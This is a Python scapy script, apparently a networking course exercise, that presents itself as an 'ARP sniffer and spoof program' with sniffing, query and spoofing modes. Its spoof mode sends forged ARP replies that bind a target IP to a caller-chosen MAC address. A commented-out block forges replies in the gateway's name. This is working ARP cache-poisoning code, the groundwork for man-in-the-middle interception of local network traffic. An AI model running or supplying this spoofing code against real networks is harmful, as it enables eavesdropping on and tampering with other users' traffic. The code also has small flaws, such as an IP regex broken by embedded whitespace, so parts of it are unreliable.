# scapy 2.3.3

from __future__ import print_function
from scapy.all import *
import os
import sys
import re

regex = '''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
            25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
            25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
            25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)'''

regex_mac = "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
gateway_ip = "140.117.172.254"

def handle_arp_packet(packet):

    # Match ARP requests
    if packet[ARP].op == ARP.who_has:
        print('Get ARP packet - who has ',packet[ARP].pdst,' ?\tTell ',packet[ARP].psrc)

    # Match ARP replies
    if packet[ARP].op == ARP.is_at:
        print(packet.summary())




def check(Ip):  
  
    # pass the regular expression 
    # and the string in search() method 
    if(re.search(regex, Ip)):  
        #print("Valid Ip address")
        return True
          
    else:  
        #print("Invalid Ip address")  
        return False
def check_mac(mac):
    if(re.search(regex_mac,mac)):
        return True
    else:
        return False
    
def scan(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast,timeout=1,verbose=False)[0]

    client_list = []
    for i in answered_list:
        client_dict = {"ip":i[1].psrc,"mac":i[1].hwsrc}
        client_list.append(client_dict)
    return client_list

def print_result(result_list):
    for client in result_list:
        print("MAC address of ",client['ip']," is ",client["mac"])
def arp_request(ip):
    arppkt = Ether()/ARP()
    arppkt[ARP].hwsrc = "74:d0:2b:9a:3f:63"
    #print(type(ip))
    #print(ip)
    arppkt[ARP].pdst = ip
    arppkt[Ether].dst = "ff:ff:ff:ff:ff:ff"
    sendp(arppkt,inter=1,count=60)
    print_result(scan(ip))
def arp_spoofing(mac,ip):
    print("[ ARP sniffer and spoof program ]")
    print("### ARP spoof mode ###")
    print("Get ARP packet - Who has ",ip," ?\ttell ",gateway_ip)
    """
    arp_pkt = ARP()
    #arp_pkt.display()
    arp_pkt.pdst = ip # target ip : argv 2
    arp_pkt.hwsrc = mac # argv 1
    arp_pkt.psrc = "140.117.162.254" # gateway ip
    arp_pkt.hwdst = "ff:ff:ff:ff:ff:ff" #broadcast
    send(arp_pkt,inter=1,count=60)
    """
    #target_mac = get_mac(ip)
    packet = ARP(op=2,hwdst="ff:ff:ff:ff:ff:ff",psrc=ip,hwsrc=mac)
    send(packet,verbose=False)
    target_mac = get_mac(ip)
    print("Sent ARP Reply : ",ip," is ",mac)
    print("Send suuccessfull.")

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]

    return (answered_list[0][1].hwsrc)

if __name__ == "__main__":
    if os.geteuid()!=0:
        print("ERROR: You must be root to use this tools!")
        sys.exit(1)
    if len(sys.argv) == 2:
        argvlist = sys.argv
        if argvlist[1] == "-help":
            print("[ ARP sniffer and spoof program ]")
            print("Format :")
            print("1) python arp_filter.py -l -a")
            print("2) python arp_filter.py -l <filter_ip_address>")
            print("3) python arp_filter.py <query_ip_address>")
            print("4) python arp_filter.py <fake_mac_address> <target_ip_address?")
    elif len(sys.argv) == 3:
        argvlist = sys.argv
        if argvlist[1] == "-l" and argvlist[2] == "-a":
            print("[ ARP sniffer and spoof program ]")
            print("### ARP sniffer mode ###")
            sniff(filter="arp", prn=handle_arp_packet)
        if argvlist[1] == "-l" and check(argvlist[2]):
            filter_packet = "arp and "+"dst net "+str(argvlist[2])
            sniff(filter=filter_packet,prn=handle_arp_packet)
        if argvlist[1] == "-q" and check(argvlist[2]):
            print("[ ARP sniffer and spoof program ]")
            print("### ARP query mode ###")
            #scan_result = scan(argvlist[2])
            #print_result(scan_result)
            arp_request(argvlist[2])
        if check_mac(argvlist[1]) and check(argvlist[2]):
            #print("spoofing")
            #arp_spoofing(argvlist[1],argvlist[2])
            #filter_packet = "arp and "+"dst net "+str(argvlist[2])
            #sniff(filter=filter_packet,prn=handle_arp_packet)
            arp_spoofing(argvlist[1],argvlist[2])

            

            
            
            
